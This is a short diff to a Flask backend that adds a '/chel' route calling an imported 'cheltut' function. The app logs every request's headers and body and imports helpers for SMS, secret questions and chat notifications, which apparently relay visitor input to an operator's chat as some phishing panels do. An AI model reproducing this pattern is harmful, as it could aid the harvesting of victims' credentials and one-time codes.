@@ -1,6 +1,6 @@
 from flask import Flask, redirect, request, jsonify
 from flask_cors import CORS
-from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol
+from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut
 from CHAT_ID import MAIN_ID, Egoist
 from checker import get_button_by_id
 app = Flask(__name__)
@@ -9,11 +9,16 @@ CORS(app, resources={r"/*": {"origins": "*"}})
 DOMEN = 'http://127.0.0.1:5500'
 
 
+
 @app.before_request
 def log_request_info():
     print('Headers:', request.headers)
     print('Body:', request.get_data())
     print('Args:', request.args)
+
+@app.route('/chel', methods=['GET', 'POST'])
+def chel():
+    cheltut()
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
